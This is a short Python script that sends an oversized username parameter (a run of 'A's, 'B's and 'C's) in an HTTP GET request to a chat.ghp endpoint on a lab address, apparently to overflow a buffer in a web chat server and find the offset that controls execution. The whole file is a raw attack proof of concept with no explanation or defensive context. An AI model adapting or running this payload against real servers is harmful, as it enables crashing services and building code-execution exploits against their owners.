#!/usr/bin/python

import socket 
import sys




fuzz = "A" * 221 + "B" * 4 + "C" * 100

buffer = 'GET /chat.ghp?username=' + fuzz + '&password=test&room=1&sex=1 HTTP/1.1\r\n\r\n'
buffer += 'Host: 192.168.0.134\r\n\r\n'  


try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.134',80))
    print ('Sending Payload........')
    s.send(buffer)
    s.close()
    
     
    
except:
    print ('Unable to Connect !........')
    sys.exit()